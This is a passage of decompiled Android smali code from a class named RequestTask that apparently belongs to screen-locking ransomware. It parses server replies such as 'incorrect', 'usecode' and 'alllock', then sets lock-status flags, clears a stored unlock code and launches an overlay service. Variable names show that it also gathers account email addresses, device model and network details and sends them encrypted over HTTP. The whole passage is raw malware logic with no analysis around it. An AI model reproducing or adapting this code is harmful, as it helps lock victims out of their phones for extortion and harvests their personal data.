    .restart local v28    # "settings":Landroid/content/SharedPreferences;
    invoke-interface/range {v28 .. v28}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v15

    .line 167
    .restart local v15    # "editor":Landroid/content/SharedPreferences$Editor;
    const-string v34, "status"

    const/16 v35, 0x4d

    move-object/from16 v0, v34

    move/from16 v1, v35

    invoke-interface {v15, v0, v1}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 168
    invoke-interface {v15}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 169
    new-instance v19, Landroid/content/Intent;

    move-object/from16 v0, p0

    iget-object v0, v0, Lbi/gemolay/sntareson/RequestTask;->mContext:Landroid/content/Context;

    move-object/from16 v34, v0

    const-class v35, Lbi/gemolay/sntareson/OverlayService;

    move-object/from16 v0, v19

    move-object/from16 v1, v34

    move-object/from16 v2, v35

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 170
    .local v19, "ii":Landroid/content/Intent;
    const-string v34, "close"

    const-string v35, "allclose"

    move-object/from16 v0, v19

    move-object/from16 v1, v34

    move-object/from16 v2, v35

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 171
    move-object/from16 v0, p0

    iget-object v0, v0, Lbi/gemolay/sntareson/RequestTask;->mContext:Landroid/content/Context;

    move-object/from16 v34, v0

    move-object/from16 v0, v34

    move-object/from16 v1, v19

    invoke-virtual {v0, v1}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 174
    .end local v15    # "editor":Landroid/content/SharedPreferences$Editor;
    .end local v19    # "ii":Landroid/content/Intent;
    .end local v28    # "settings":Landroid/content/SharedPreferences;
    :cond_4
    const-string v34, "incorrect"

    move-object/from16 v0, v27

    move-object/from16 v1, v34

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v34

    if-eqz v34, :cond_5

    .line 176
    move-object/from16 v0, p0

    iget-object v0, v0, Lbi/gemolay/sntareson/RequestTask;->mContext:Landroid/content/Context;

    move-object/from16 v34, v0

    const-string v35, "cocon"

    const/16 v36, 0x0

    invoke-virtual/range {v34 .. v36}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v28

    .line 177
    .restart local v28    # "settings":Landroid/content/SharedPreferences;
    invoke-interface/range {v28 .. v28}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v15

    .line 178
    .restart local v15    # "editor":Landroid/content/SharedPreferences$Editor;
    const-string v34, "status"

    const/16 v35, 0x3

    move-object/from16 v0, v34

    move/from16 v1, v35

    invoke-interface {v15, v0, v1}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 179
    invoke-interface {v15}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 180
    move-object/from16 v0, p0

    iget-object v0, v0, Lbi/gemolay/sntareson/RequestTask;->mContext:Landroid/content/Context;

    move-object/from16 v34, v0

    new-instance v35, Landroid/content/Intent;

    move-object/from16 v0, p0

    iget-object v0, v0, Lbi/gemolay/sntareson/RequestTask;->mContext:Landroid/content/Context;

    move-object/from16 v36, v0

    const-class v37, Lbi/gemolay/sntareson/OverlayService;

    invoke-direct/range {v35 .. v37}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual/range {v34 .. v35}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 182
    .end local v15    # "editor":Landroid/content/SharedPreferences$Editor;
    .end local v28    # "settings":Landroid/content/SharedPreferences;
    :cond_5
    const-string v34, "usecode"

    move-object/from16 v0, v27

    move-object/from16 v1, v34

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v34

    if-eqz v34, :cond_6

    .line 184
    move-object/from16 v0, p0

    iget-object v0, v0, Lbi/gemolay/sntareson/RequestTask;->mContext:Landroid/content/Context;

    move-object/from16 v34, v0

    const-string v35, "cocon"

    const/16 v36, 0x0

    invoke-virtual/range {v34 .. v36}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v28

    .line 185
    .restart local v28    # "settings":Landroid/content/SharedPreferences;
    invoke-interface/range {v28 .. v28}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v15

    .line 186
    .restart local v15    # "editor":Landroid/content/SharedPreferences$Editor;
    const-string v34, "status"

    const/16 v35, 0x4

    move-object/from16 v0, v34

    move/from16 v1, v35

    invoke-interface {v15, v0, v1}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 187
    invoke-interface {v15}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 188
    move-object/from16 v0, p0

    iget-object v0, v0, Lbi/gemolay/sntareson/RequestTask;->mContext:Landroid/content/Context;

    move-object/from16 v34, v0

    new-instance v35, Landroid/content/Intent;

    move-object/from16 v0, p0

    iget-object v0, v0, Lbi/gemolay/sntareson/RequestTask;->mContext:Landroid/content/Context;

    move-object/from16 v36, v0

    const-class v37, Lbi/gemolay/sntareson/OverlayService;

    invoke-direct/range {v35 .. v37}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual/range {v34 .. v35}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 190
    .end local v15    # "editor":Landroid/content/SharedPreferences$Editor;
    .end local v28    # "settings":Landroid/content/SharedPreferences;
    :cond_6
    const-string v34, "alllock"

    move-object/from16 v0, v27

    move-object/from16 v1, v34

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v34

    if-eqz v34, :cond_7

    .line 191
    const-string v34, "muuuu"

    const-string v35, "ooopppsss"

    invoke-static/range {v34 .. v35}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 194
    move-object/from16 v0, p0

    iget-object v0, v0, Lbi/gemolay/sntareson/RequestTask;->mContext:Landroid/content/Context;

    move-object/from16 v34, v0

    const-string v35, "cocon"

    const/16 v36, 0x0

    invoke-virtual/range {v34 .. v36}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v28

    .line 195
    .restart local v28    # "settings":Landroid/content/SharedPreferences;
    invoke-interface/range {v28 .. v28}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v15

    .line 196
    .restart local v15    # "editor":Landroid/content/SharedPreferences$Editor;
    const-string v34, "status"

    const/16 v35, 0x0

    move-object/from16 v0, v34

    move/from16 v1, v35

    invoke-interface {v15, v0, v1}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 197
    const-string v34, "animation"

    const/16 v35, 0x0

    move-object/from16 v0, v34

    move/from16 v1, v35

    invoke-interface {v15, v0, v1}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 198
    const-string v34, "pcode"

    const-string v35, ""

    move-object/from16 v0, v34

    move-object/from16 v1, v35

    invoke-interface {v15, v0, v1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 199
    invoke-interface {v15}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 200
    move-object/from16 v0, p0

    iget-object v0, v0, Lbi/gemolay/sntareson/RequestTask;->mContext:Landroid/content/Context;

    move-object/from16 v34, v0

    new-instance v35, Landroid/content/Intent;

    move-object/from16 v0, p0

    iget-object v0, v0, Lbi/gemolay/sntareson/RequestTask;->mContext:Landroid/content/Context;

    move-object/from16 v36, v0

    const-class v37, Lbi/gemolay/sntareson/OverlayService;

    invoke-direct/range {v35 .. v37}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual/range {v34 .. v35}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 207
    .end local v4    # "accounts":[Landroid/accounts/Account;
    .end local v5    # "activeNetwork":Landroid/net/NetworkInfo;
    .end local v6    # "base64":Ljava/lang/String;
    .end local v7    # "camera":I
    .end local v8    # "cm":Landroid/net/ConnectivityManager;
    .end local v9    # "code":Ljava/lang/String;
    .end local v10    # "data":Ljava/lang/String;
    .end local v11    # "data2":Ljava/lang/String;
    .end local v12    # "data3":[B
    .end local v15    # "editor":Landroid/content/SharedPreferences$Editor;
    .end local v16    # "email":Ljava/lang/String;
    .end local v17    # "emailPattern":Ljava/util/regex/Pattern;
    .end local v18    # "hc":Lorg/apache/http/impl/client/DefaultHttpClient;
    .end local v20    # "isMobile":Z
    .end local v21    # "isWifi":Z
    .end local v22    # "mcrypt":Lbi/gemolay/sntareson/MCrypt;
    .end local v23    # "nameValuePairs":Ljava/util/List;, "Ljava/util/List<Lorg/apache/http/NameValuePair;>;"
    .end local v25    # "postMethod":Lorg/apache/http/client/methods/HttpPost;
    .end local v26    # "res":Lorg/apache/http/client/ResponseHandler;, "Lorg/apache/http/client/ResponseHandler<Ljava/lang/String;>;"
    .end local v27    # "response":Ljava/lang/String;
    .end local v28    # "settings":Landroid/content/SharedPreferences;
    .end local v29    # "settings2":Landroid/content/SharedPreferences;
    .end local v30    # "settings3":Landroid/content/SharedPreferences;
    .end local v31    # "status":I
    .end local v32    # "status2":I
    .end local v33    # "typenet":Ljava/lang/String;
    :cond_7
    :goto_3
    const/16 v34, 0x0

    return-object v34

    .line 88
    .restart local v5    # "activeNetwork":Landroid/net/NetworkInfo;
    .restart local v8    # "cm":Landroid/net/ConnectivityManager;
    .restart local v18    # "hc":Lorg/apache/http/impl/client/DefaultHttpClient;
    .restart local v23    # "nameValuePairs":Ljava/util/List;, "Ljava/util/List<Lorg/apache/http/NameValuePair;>;"
    .restart local v25    # "postMethod":Lorg/apache/http/client/methods/HttpPost;
    .restart local v26    # "res":Lorg/apache/http/client/ResponseHandler;, "Lorg/apache/http/client/ResponseHandler<Ljava/lang/String;>;"
    .restart local v33    # "typenet":Ljava/lang/String;
    :cond_8
    const/16 v20, 0x0

    goto/16 :goto_0

    .line 100
    .restart local v4    # "accounts":[Landroid/accounts/Account;
    .restart local v16    # "email":Ljava/lang/String;
    .restart local v17    # "emailPattern":Ljava/util/regex/Pattern;
    .restart local v20    # "isMobile":Z
    .restart local v21    # "isWifi":Z
    :cond_9
    aget-object v3, v4, v34

    .line 101
    .local v3, "account":Landroid/accounts/Account;
    iget-object v0, v3, Landroid/accounts/Account;->name:Ljava/lang/String;

    move-object/from16 v36, v0

    move-object/from16 v0, v17

    move-object/from16 v1, v36

    invoke-virtual {v0, v1}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v36

    invoke-virtual/range {v36 .. v36}, Ljava/util/regex/Matcher;->matches()Z

    move-result v36

    if-eqz v36, :cond_a

    .line 102
    iget-object v0, v3, Landroid/accounts/Account;->name:Ljava/lang/String;

    move-object/from16 v24, v0

    .line 103
    .local v24, "possibleEmail":Ljava/lang/String;
    new-instance v36, Ljava/lang/StringBuilder;

    invoke-static/range {v16 .. v16}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v37

    invoke-direct/range {v36 .. v37}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v37, ", "

    invoke-virtual/range {v36 .. v37}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v36

    move-object/from16 v0, v36

    move-object/from16 v1, v24

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v36

    invoke-virtual/range {v36 .. v36}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v16

    .line 100
    .end local v24    # "possibleEmail":Ljava/lang/String;
    :cond_a
    add-int/lit8 v34, v34, 0x1

    goto/16 :goto_1

    .line 130
    .end local v3    # "account":Landroid/accounts/Account;
    .restart local v6    # "base64":Ljava/lang/String;
    .restart local v7    # "camera":I
    .restart local v9    # "code":Ljava/lang/String;
    .restart local v10    # "data":Ljava/lang/String;
    .restart local v11    # "data2":Ljava/lang/String;
    .restart local v12    # "data3":[B
    .restart local v22    # "mcrypt":Lbi/gemolay/sntareson/MCrypt;
    .restart local v30    # "settings3":Landroid/content/SharedPreferences;
    .restart local v31    # "status":I
    :catch_0
    move-exception v14

    .line 131
    .local v14, "e1":Ljava/io/UnsupportedEncodingException;
    invoke-virtual {v14}, Ljava/io/UnsupportedEncodingException;->printStackTrace()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    goto/16 :goto_2

    .line 204
    .end local v4    # "accounts":[Landroid/accounts/Account;
    .end local v5    # "activeNetwork":Landroid/net/NetworkInfo;
    .end local v6    # "base64":Ljava/lang/String;
    .end local v7    # "camera":I
    .end local v8    # "cm":Landroid/net/ConnectivityManager;
    .end local v9    # "code":Ljava/lang/String;
    .end local v10    # "data":Ljava/lang/String;
    .end local v11    # "data2":Ljava/lang/String;
    .end local v12    # "data3":[B
    .end local v14    # "e1":Ljava/io/UnsupportedEncodingException;
    .end local v16    # "email":Ljava/lang/String;
    .end local v17    # "emailPattern":Ljava/util/regex/Pattern;
    .end local v18    # "hc":Lorg/apache/http/impl/client/DefaultHttpClient;
    .end local v20    # "isMobile":Z
    .end local v21    # "isWifi":Z
    .end local v22    # "mcrypt":Lbi/gemolay/sntareson/MCrypt;
    .end local v23    # "nameValuePairs":Ljava/util/List;, "Ljava/util/List<Lorg/apache/http/NameValuePair;>;"
    .end local v25    # "postMethod":Lorg/apache/http/client/methods/HttpPost;
    .end local v26    # "res":Lorg/apache/http/client/ResponseHandler;, "Lorg/apache/http/client/ResponseHandler<Ljava/lang/String;>;"
    .end local v30    # "settings3":Landroid/content/SharedPreferences;
    .end local v31    # "status":I
    .end local v33    # "typenet":Ljava/lang/String;
    :catch_1
    move-exception v13

    .line 205
    .local v13, "e":Ljava/lang/Exception;
    sget-object v34, Ljava/lang/System;->out:Ljava/io/PrintStream;

    new-instance v35, Ljava/lang/StringBuilder;

    const-string v36, "Exp="

    invoke-direct/range {v35 .. v36}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v35

    invoke-virtual {v0, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v35

    invoke-virtual/range {v35 .. v35}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v35

    invoke-virtual/range {v34 .. v35}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    goto :goto_3
.end method

.method public getDeviceName()Ljava/lang/String;
    .locals 4

    .prologue
    .line 48
    sget-object v0, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;

    .line 49
    .local v0, "manufacturer":Ljava/lang/String;
    sget-object v1, Landroid/os/Build;->MODEL:Ljava/lang/String;

    .line 50
    .local v1, "model":Ljava/lang/String;
    invoke-virtual {v1, v0}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_0

    .line 51
    invoke-direct {p0, v1}, Lbi/gemolay/sntareson/RequestTask;->capitalize(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 53
    :goto_0
    return-object v2

    :cond_0
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {p0, v0}, Lbi/gemolay/sntareson/RequestTask;->capitalize(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v3, " "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    goto :goto_0
.end method
